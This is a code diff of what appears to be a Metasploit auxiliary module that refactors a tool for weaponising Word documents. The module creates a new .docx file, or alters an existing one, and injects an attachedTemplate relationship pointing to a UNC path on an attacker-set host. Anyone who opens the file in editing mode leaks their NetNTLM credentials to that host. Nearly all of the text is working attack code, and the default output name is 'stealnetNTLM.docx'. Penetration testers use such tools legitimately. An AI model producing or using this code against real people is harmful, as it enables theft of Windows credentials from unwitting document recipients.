@@ -6,9 +6,12 @@
 ##
 
 require 'msf/core'
-require 'zip/zip'
+require 'zip/zip' #for extracting files
+require 'rex/zip' #for creating files
 
 class Metasploit3 < Msf::Auxiliary
+
+	include Msf::Exploit::FILEFORMAT
 
 	def initialize(info = {})
 		super(update_info(info,
@@ -19,10 +22,9 @@ class Metasploit3 < Msf::Auxiliary
 					If emailed the receiver needs to put the document in editing mode
 					before the remote server will be contacted. Preview and read-only
 					mode do not work. Verified to work with Microsoft Word 2003,
-					2007 and 2010 as of Januari 2013 date by using auxiliary/server/capture/smb
+					2007 and 2010 as of January 2013 date by using auxiliary/server/capture/smb
 			},
 			'License'        => MSF_LICENSE,
-			'Version'        => '$Revision: 1 $',
 			'References'     =>
 			[
 				[ 'URL', 'http://jedicorp.com/?p=534' ],
@@ -35,285 +37,148 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options(
 			[
-				OptAddress.new('LHOST',[true, 'Server IP or hostname that the .docx document points to','']),
-				OptString.new('SRCFILE', [false, '.docx file to backdoor. If left empty, creates an emtpy document', '']),
-				OptString.new('SKLFILENAME', [false,'Document output filename', 'stealnetNTLM.docx']),
-				OptPath.new('SKLOUTPUTPATH', [false, 'The location where the backdoored empty .docx file will be written','./']),
-				OptString.new('SKLDOCAUTHOR',[false,'Document author for skeleton document', 'SphaZ']),
+				OptAddress.new('LHOST',[true, 'Server IP or hostname that the .docx document points to.','']),
+				OptPath.new('SOURCE', [false, 'Full path and filename of .docx file to use as source. If empty, creates new document', '']),
+				OptString.new('FILENAME', [true, 'Document output filename.', 'stealnetNTLM.docx']),
+				OptString.new('DOCAUTHOR',[false,'Document author for empty document.', '']),
 			], self.class)
 	end
 
+	#here we create an empty .docx file with the UNC path. Only done when FILENAME is empty
+	def make_new_file
+		metadata_file_data = ""
+		metadata_file_data << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><cp:coreProperties"
+		metadata_file_data << " xmlns:cp=\"http://schemas.openxmlformats.org/package/2006/metadata/core-properties\" "
+		metadata_file_data << "xmlns:dc=\"http://purl.org/dc/elements/1.1/\" xmlns:dcterms=\"http://purl.org/dc/terms/\" "
+		metadata_file_data << "xmlns:dcmitype=\"http://purl.org/dc/dcmitype/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">"
+		metadata_file_data << "<dc:creator>#{datastore['DOCAUTHOR']}</dc:creator><cp:lastModifiedBy>#{datastore['DOCAUTHOR']}"
+		metadata_file_data << "</cp:lastModifiedBy><cp:revision>1</cp:revision><dcterms:created xsi:type=\"dcterms:W3CDTF\">"
+		metadata_file_data << "2013-01-08T14:14:00Z</dcterms:created><dcterms:modified xsi:type=\"dcterms:W3CDTF\">"
+		metadata_file_data << "2013-01-08T14:14:00Z</dcterms:modified></cp:coreProperties>"
 
-	#here we create an empty .docx file with the UNC path. Only done when SRCFILE is empty
-	def makeNewFile
-		metadataFileData = ""
-		metadataFileData << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><cp:coreProperties"
-		metadataFileData << " xmlns:cp=\"http://schemas.openxmlformats.org/package/2006/metadata/core-properties\" "
-		metadataFileData << "xmlns:dc=\"http://purl.org/dc/elements/1.1/\" xmlns:dcterms=\"http://purl.org/dc/terms/\" "
-		metadataFileData << "xmlns:dcmitype=\"http://purl.org/dc/dcmitype/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">"
-		metadataFileData << "<dc:creator>#{datastore['SKLDOCAUTHOR']}</dc:creator><cp:lastModifiedBy>#{datastore['SKLDOCAUTHOR']}"
-		metadataFileData << "</cp:lastModifiedBy><cp:revision>1</cp:revision><dcterms:created xsi:type=\"dcterms:W3CDTF\">"
-		metadataFileData << "2013-01-08T14:14:00Z</dcterms:created><dcterms:modified xsi:type=\"dcterms:W3CDTF\">"
-		metadataFileData << "2013-01-08T14:14:00Z</dcterms:modified></cp:coreProperties>"
+		#where to find the skeleton files required for creating an empty document
+		data_dir = File.join(Msf::Config.install_root, "data", "exploits", "docx")
 
-		#Lets get the local filepath to figure out where we need to write the metadata file
-		metadataFileName = File.dirname(self.file_path)+'/sourcedoc/docProps/core.xml'
-		begin
-			if File.exists?(metadataFileName)
-				vprint_status("Deleting metadatafile")
-				File.delete(metadataFileName)
+		#making the actual docx
+		docx = Rex::Zip::Archive.new
+		#add skeleton files
+		vprint_status("Adding skeleton files from #{data_dir}")
+		Dir["#{data_dir}/**/**"].each do |file|
+			if not File.directory?(file)
+				docx.add_file(file.sub(data_dir,''), File.read(file))
 			end
-			fd = File.open( metadataFileName, 'wb+' )
-			fd.puts(metadataFileData)
-			fd.close
-		rescue
-			print_error("Cant write to #{metadataFileName} make sure module and data are intact")
-			return nil
 		end
-
-		#now lets write the _rels file that contains the UNC path
-		refdataFileName = File.dirname(self.file_path) + '/sourcedoc/word/_rels/settings.xml.rels'
-		begin
-			fd = File.open( refdataFileName, 'wb+' )
-			fd.puts(@relsFileData)
-			fd.close
-		rescue
-			print_error("Cant write to #{refdataFileName} make sure module and data are intact.")
-			return nil
-		end
-
-		#and finally, lets creat the .docx file
-		inputPath = File.dirname(self.file_path) + '/sourcedoc/'
-		inputPath.sub!(%r[/S],'')
-
-		archive = File.join(datastore['SKLOUTPUTPATH'], datastore['SKLFILENAME'])
-		#if file exists, lets not overwrite
-		if File.exists?(archive)
-			print_error("Output file #{archive} already exists! Set a different name for SKLOUTPUTPATH and/or SKLFILENAME.")
-			return nil
-		end
-
-		if zipDocx(inputPath, archive, false).nil?
-			return nil
-		end
-
-		begin
-			#delete the created xml files, the less evidence of parameters used the better
-			File.delete(File.dirname(self.file_path)+'/sourcedoc/docProps/core.xml')
-			File.delete(File.dirname(self.file_path) + '/sourcedoc/word/_rels/settings.xml.rels')
-		rescue
-			print_error("Error deleting local core and settings documents. Generating new file worked though")
-		end
-		return 0
+		#add on-the-fly created documents
+		vprint_status("Adding injected files")
+		docx.add_file("docProps/core.xml", metadata_file_data)
+		docx.add_file("word/_rels/settings.xml.rels", @rels_file_data)
+		#add the otherwise skipped "hidden" file
+		file = "#{data_dir}/_rels/.rels"
+		docx.add_file(file.sub(data_dir,''), File.read(file))
+		#and lets create the file
+		file_create(docx.pack)
 	end
 
-
-	#this bit checks the settings.xml and looks for the relations file entry we need for our evil masterplan.
-	#and then inserts the UNC path into the _rels file.
-	def manipulateFile
+	#here we inject an UNC path into an existing file, and store the injected file in FILENAME
+	def manipulate_file
 		ref = "<w:attachedTemplate r:id=\"rId1\"/>"
 
-		if File.exists?(datastore['SRCFILE'])
-			if File.stat(datastore['SRCFILE']).readable? and File.stat(datastore['SRCFILE']).writable?
-				vprint_status("We can read and write the file, this is probably a good thing :P")
-			else
-				print_error("Not enough rights to modify the file. Aborting.")
-				return nil
-			end
+		if not File.stat(datastore['SOURCE']).readable?
+			print_error("Not enough rights to read the file. Aborting.")
+			return nil
+		end
 
-			fileContent = getFileFromDocx("word/settings.xml")
-			if fileContent.nil?
-				return nil
-			end
+		#lets extract our docx and store it in memory
+		zip_data = unzip_docx
 
-			if not fileContent.index("w:attachedTemplate r:id=\"rId1\"").nil?
-				vprint_status("Reference to rels file already exists in settings file, we dont need to add it :)")
-				#and we put just our rels file into the docx
-				if unzipDocx.nil?
-					return nil
-				end
-				if updateDocxFile("word/_rels/settings.xml.rels", @relsFileData).nil?
-					return nil
-				end
-				#ok we got through this, lets zip the file, overwriting the original in this case
-				begin
-					File.delete(datastore['SRCFILE'])
-					if zipDocx(@tmpDir, datastore['SRCFILE'],true).nil?
-						return nil
-					end
-				rescue
-					print_error("Can't modify the original document :(")
-					return nil
-				end
-			else
-				#now insert the reference to the file that will enable our malicious entry
-				insertOne = fileContent.index("<w:defaultTabStop")
+		#file to check for reference file we need
+		file_content = zip_data["word/settings.xml"]
+		if file_content.nil?
+			print_error("Bad \"word/settings.xml\" file, check if it is a valid .docx.")
+			return nil
+		end
 
-				if insertOne.nil?
-					insertTwo = fileContent.index("<w:hyphenationZone") # 2nd choice
-					if not insertTwo.nil?
-						vprint_status("HypenationZone found, we use this for insertion.")
-						fileContent.insert(insertTwo, ref )
-						end
-				else
-					vprint_status("DefaultTabStop found, we use this for insertion.")
-					fileContent.insert(insertOne, ref )
-					end
-
-				if insertOne.nil? && insertTwo.nil?
-					vprint_error("Cannot find insert point for reference into settings.xml")
-					return nil
-				end
-
-				if unzipDocx.nil?
-					return nil
-				end
-				#update the settings files
-				if updateDocxFile("word/settings.xml",fileContent).nil?
-					print_error("Error inserting data into word/settings.xml")
-					return nil
-				end
-				if updateDocxFile("word/_rels/settings.xml.rels", @relsFileData).nil?
-					print_error("Eror inserting data into word/_rels/settings.xml.rels")
-					return nil
-				end
-				#ok we got through this, lets zip the file, overwriting the original in this case
-				begin
-					File.delete(datastore['SRCFILE'])
-					if zipDocx(@tmpDir, datastore['SRCFILE'],true).nil?
-						return nil
-					end
-				rescue
-					print_error("Can't modify the original document :(")
-					return nil
-				end
-
-			end
+		#if we can find the reference to our inject file, we don't need to add it and can just inject our unc path.
+		if not file_content.index("w:attachedTemplate r:id=\"rId1\"").nil?
+			vprint_status("Reference to rels file already exists in settings file, we dont need to add it :)")
+			zip_data["word/_rels/settings.xml.rels"] = @rels_file_data
+			# lets zip the end result
+			zip_docx(zip_data)
 		else
-			print_error("File #{datastore['SRCFILE']} does not exist. Aborting.")
-			return nil
-		end
+			#now insert the reference to the file that will enable our malicious entry
+			insert_one = file_content.index("<w:defaultTabStop")
 
-		return 0
-	end
-
-	#read a file from .docx into a string
-	def getFileFromDocx(fileString)
-		begin
-			Zip::ZipFile.open(datastore['SRCFILE']) do |fileZip|
-				fileZip.each do |f|
-					next unless f.to_s == fileString
-					return f.get_input_stream.read
+			if insert_one.nil?
+				insert_two = file_content.index("<w:hyphenationZone") # 2nd choice
+				if not insert_two.nil?
+					vprint_status("HypenationZone found, we use this for insertion.")
+					file_content.insert(insert_two, ref )
 				end
+			else
+				vprint_status("DefaultTabStop found, we use this for insertion.")
+				file_content.insert(insert_one, ref )
 			end
-			fileZip.close
-			print_error("Cant find #{fileString} inside the .docx")
-			return nil
-		rescue
-			print_error("Unknown error reading docx file.")
-			fileZip.close
-			return nil
-		end
-		fileZip.close
-	end
 
-	def zipDocx(inputPath, archive, delsource)
-		begin
-			#add the prepared files to the zip file
-			Zip::ZipFile.open(archive, 'wb') do |fileZip|
-				Dir["#{inputPath}/**/**"].reject{|f|f==archive}.each do |file|
-					fileZip.add(file.sub(inputPath+'/',''), file)
-				end
-				relsFile = inputPath + '/_rels/.rels'
-				fileZip.add(relsFile.sub(inputPath+'/',''), relsFile)
-			end
-		rescue
-			print_error("Error zipping file..")
-			begin
-				FileUtils.rm_rf(inputPath)
-			rescue
-				print_error("Cant even clean up my own mess, I give up")
+			if insert_one.nil? && insert_two.nil?
+				print_error("Cannot find insert point for reference into settings.xml")
 				return nil
 			end
-			return nil
-		end
-		#do we delete the source?
-		if delsource
-			begin
-				FileUtils.rm_rf(inputPath)
-			rescue
-				print_error("Cant even clean up my own mess, I give up")
-			end
+
+			#update the files that contain the injection and reference
+			zip_data["word/settings.xml"] = file_content
+			zip_data["word/_rels/settings.xml.rels"] = @rels_file_data
+			#lets zip the file
+			zip_docx(zip_data)
 		end
 		return 0
 	end
 
-	def unzipDocx
+	#making the actual docx from the hash
+	def zip_docx(zip_data)
+		docx = Rex::Zip::Archive.new
+		zip_data.each_pair do |k,v|
+			docx.add_file(k,v)
+		end
+		file_create(docx.pack)
+	end
+
+	#unzip the .docx document. sadly Rex::zip does not uncompress so we do it the Rubyzip way
+	def unzip_docx
+		#Ruby sometimes corrupts the document when manipulating inside a compressed document, so we extract it with Zip::ZipFile
+		vprint_status("Extracting #{datastore['SOURCE']} into memory.")
+		#we read it all into memory
+		zip_data = Hash.new
 		begin
-			vprint_status("tmpdir: #{@tmpDir}")
-			if not File.directory?(@tmpDir)
-				vprint_status("Damn rubyzip cant be relied upon, so we do it the hard way. Extracting #{datastore['SRCFILE']}")
-				Zip::ZipFile.open(datastore['SRCFILE'])  do |fileZip|
-					fileZip.each do |entry|
-						if not entry.nil?
-							vprint_status("extracting entry: #{entry.name}")
-						end
-						fpath = File.join(@tmpDir, entry.name)
-						FileUtils.mkdir_p(File.dirname(fpath))
-						fileZip.extract(entry, fpath)
-					end
+			Zip::ZipFile.open(datastore['SOURCE'])  do |filezip|
+				filezip.each do |entry|
+					zip_data[entry.name] = filezip.read(entry)
 				end
 			end
-		rescue
-			print_error("There was an error unzipping")
+		rescue Zip::ZipError => e
+			print_error("Error extracting #{datastore['SOURCE']} please verify it is a valid .docx document.")
 			return nil
 		end
-		return 0
+		return zip_data
 	end
 
-	#used for updating the files inside the docx from a string
-	def updateDocxFile(fileString, content)
-		begin
-			#ok so now we unpacked the docx file, lets start to update the file we need to do
-			#does the file already exist?
-			archive = File.join(@tmpDir, fileString)
-			vprint_status("We need to look for: #{archive}")
-			if File.exists?(archive)
-				vprint_status("Deleting original file #{archive}")
-				File.delete(archive)
-			end
-			#now lets put OUR file there
-			File.open(archive, 'wb+') { |f| f.write(content) }
-		rescue Exception => ex
-			print_error("Well, extracting and manipulating the file went wrong :(")
-			return nil
-		end
-		return 0
-	end
 
 	def run
-		#we need this in in bot makeNewFile and manipulateFile
-		@relsFileData = ""
-		@relsFileData << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>".chomp
-		@relsFileData << "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">".chomp
-		@relsFileData << "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/".chomp
-		@relsFileData << "attachedTemplate\" Target=\"file://\\\\#{datastore['LHOST']}\\normal.dot\" TargetMode=\"External\"/></Relationships>"
-		#where do we unpack our file?
-		@tmpDir = "#{Dir.tmpdir}/#{Time.now.to_i}#{rand(1000)}/"
+		#we need this in make_new_file and manipulate_file
+		@rels_file_data = ""
+		@rels_file_data << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>".chomp
+		@rels_file_data << "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">".chomp
+		@rels_file_data << "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/".chomp
+		@rels_file_data << "attachedTemplate\" Target=\"file://\\\\#{datastore['LHOST']}\\normal.dot\" TargetMode=\"External\"/></Relationships>"
 
-		if "#{datastore['SRCFILE']}" == ""
+		if "#{datastore['SOURCE']}" == ""
 			#make an empty file
-			print_status("Creating empty document")
-			if not makeNewFile.nil?
-				print_good("Success! Document #{datastore['SKLFILENAME']} created in #{datastore['SKLOUTPUTPATH']}")
-			end
+			print_status("Creating empty document that points to #{datastore['LHOST']}.")
+			make_new_file
 		else
 			#extract the word/settings.xml and edit in the reference we need
 			print_status("Injecting UNC path into existing document.")
-			if not manipulateFile.nil?
-				print_good("Success! Document #{datastore['SRCFILE']} now references to #{datastore['LHOST']}")
-			else
-				print_error("Something went wrong!")
+			if not manipulate_file.nil?
+				print_good("Copy of #{datastore['SOURCE']} called #{datastore['FILENAME']} points to #{datastore['LHOST']}.")
 			end
 		end
 	end
